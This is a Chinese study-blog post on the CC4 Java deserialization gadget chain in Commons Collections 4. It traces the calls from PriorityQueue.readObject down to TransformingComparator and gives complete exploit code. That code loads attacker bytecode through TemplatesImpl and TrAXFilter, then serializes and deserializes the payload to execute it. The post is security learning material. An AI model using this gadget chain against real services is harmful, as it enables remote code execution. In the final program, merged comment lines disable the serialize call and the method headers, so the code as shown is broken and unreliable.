---
title: "cc4链的学习"
date: "2026-11-06 16:29:22"
updated: "2026-11-06 16:29:22"
permalink: "2026/11/06/cc4-study/"
categories: ["安全学习", "Java 反序列化"]
tags: ["Java", "反序列化", "CC4"]
description: "CC4 链学习记录：TransformingComparator、PriorityQueue.readObject、heapify 与 siftDown 的调用关系，以及字节码加载实验示例。"
excerpt: "CC4 链学习记录：TransformingComparator、PriorityQueue.readObject、heapify 与 siftDown 的调用关系，以及字节码加载实验示例。"
obsidian_source: "cc4链的学习.md"
---

## 复用字节码加载方式

学完之前的三条链，之后的内容就很简单了

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InstantiateTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
  
import javax.xml.crypto.dsig.Transform;  
import javax.xml.transform.Templates;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
  
public class cc4stu {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> aClass = templates.getClass();  
        Field name = aClass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"nihao");  
        byte[] bytes = Files.readAllBytes(Paths.get("C://nihao.class"));  
  
        Field bytecodes = aClass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        bytecodes.set(templates,new byte[][]{bytes});  
  
        Field tfactory = aClass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates, new TransformerFactoryImpl() );  
//        templates.newTransformer();  
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});  
//        instantiateTransformer.transform(TrAXFilter.class);  
        instantiateTransformer.transform(TrAXFilter.class);  
  
    }  
}
```
按照之前加载字节码的方式弹出计算器

## TransformingComparator 的 compare 方法

接下来就找谁调用了transformer方法‘
我们在TransformingComparator.java找到了这个方法
```java
public int compare(Object obj1, Object obj2) {  
    Object value1 = this.transformer.transform(obj1);  
    Object value2 = this.transformer.transform(obj2);  
    return this.decorated.compare(value1, value2);  
}
```

## PriorityQueue 与比较器调用

接着找谁调用了compare
我们在PriorityQueue.java找到了siftDownUsingComparator
```java
private void siftDownUsingComparator(int k, E x) {  
    int half = size >>> 1;  
    while (k < half) {  
        int child = (k << 1) + 1;  
        Object c = queue[child];  
        int right = child + 1;  
        if (right < size &&  
            comparator.compare((E) c, (E) queue[right]) > 0)  
            c = queue[child = right];  
        if (comparator.compare(x, (E) c) <= 0)  
            break;  
        queue[k] = c;  
        k = child;  
    }  
    queue[k] = x;  
}
```

## 反序列化入口 readObject

我们看这个类的入口类
```java
private void readObject(java.io.ObjectInputStream s)  
    throws java.io.IOException, ClassNotFoundException {  
    // Read in size, and any hidden stuff  
    s.defaultReadObject();  
  
    // Read in (and discard) array length  
    s.readInt();  
  
    queue = new Object[size];  
  
    // Read in all elements.  
    for (int i = 0; i < size; i++)  
        queue[i] = s.readObject();  
  
    // Elements are guaranteed to be in "proper order", but the  
    // spec has never explained what that might be.    
    heapify();  
}
```

## heapify 与 siftDown

接着跟进heapify这个方法
```java
private void heapify() {  
    for (int i = (size >>> 1) - 1; i >= 0; i--)  
        siftDown(i, (E) queue[i]);  
}
```
接着跟进siftdown
```java
private void siftDown(int k, E x) {  
    if (comparator != null)  
        siftDownUsingComparator(k, x);  
    else  
        siftDownComparable(k, x);  
}
```
形成闭合了。这些都是在同一个类里的，这条链也就几乎完成了
入口readobject调用heapify，heapify调用siftdown，它有调用siftDownUsingComparator，里面调用了compare，他又调用了transform，形成这一阶段的闭合

## 实验代码

接着编写exp
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections4.comparators.TransformingComparator;  
import org.apache.commons.collections4.Transformer;  
import org.apache.commons.collections4.functors.ChainedTransformer;  
import org.apache.commons.collections4.functors.ConstantTransformer;  
import org.apache.commons.collections4.functors.InstantiateTransformer;  
import org.apache.commons.collections4.functors.InvokerTransformer;  
  
import javax.xml.crypto.dsig.Transform;  
import javax.xml.transform.Templates;  
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.io.ObjectInputStream;  
import java.io.ObjectOutputStream;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.PriorityQueue;  
  
public class cc4stu {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> aClass = templates.getClass();  
        Field name = aClass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"nihao");  
        byte[] bytes = Files.readAllBytes(Paths.get("C://nihao.class"));  
  
        Field bytecodes = aClass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        bytecodes.set(templates,new byte[][]{bytes});  
  
        Field tfactory = aClass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates, new TransformerFactoryImpl() );  
//        templates.newTransformer();  
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});  
//        instantiateTransformer.transform(TrAXFilter.class);  
//        instantiateTransformer.transform(TrAXFilter.class);  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class),  
                instantiateTransformer  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer<>(transformers);  
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);  
  
  
        PriorityQueue<Object> queue = new PriorityQueue<>(2,transformingComparator);  
        queue.add(1);  
        queue.add(2);  
  
        // ===== 新增：序列化 =====        byte[] ser = serialize(queue);  
        System.out.println("[*] serialized bytes length = " + ser.length);  
  
        // ===== 新增：反序列化 =====        deserialize(ser);  
    }  
  
    // ===== 新增：序列化方法 =====    public static byte[] serialize(Object obj) throws Exception {  
        ByteArrayOutputStream bos = new ByteArrayOutputStream();  
        ObjectOutputStream oos = new ObjectOutputStream(bos);  
        oos.writeObject(obj);  
        oos.flush();  
        oos.close();  
        return bos.toByteArray();  
    }  
  
    // ===== 新增：反序列化方法 =====    public static Object deserialize(byte[] data) throws Exception {  
        ByteArrayInputStream bis = new ByteArrayInputStream(data);  
        ObjectInputStream ois = new ObjectInputStream(bis);  
        Object obj = ois.readObject();  
        ois.close();  
        return obj;  
    }  
}
```
弹出计算器

---

**本系列笔记：** [Java安全学习](/2026/11/01/java-security-urldns/) · [Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记](/2026/11/01/cc1-study-notes/) · [cc1链学习](/2026/11/01/cc1-transformedmap/) · [正版cc1链学习](/2026/11/01/cc1-lazymap/) · [cc3链学习](/2026/11/01/cc3-classloading/) · [cc6链学习](/2026/11/01/cc6-study/) · [cc4链的学习](/2026/11/06/cc4-study/) · [cc2学习](/2026/11/10/cc2-study/)
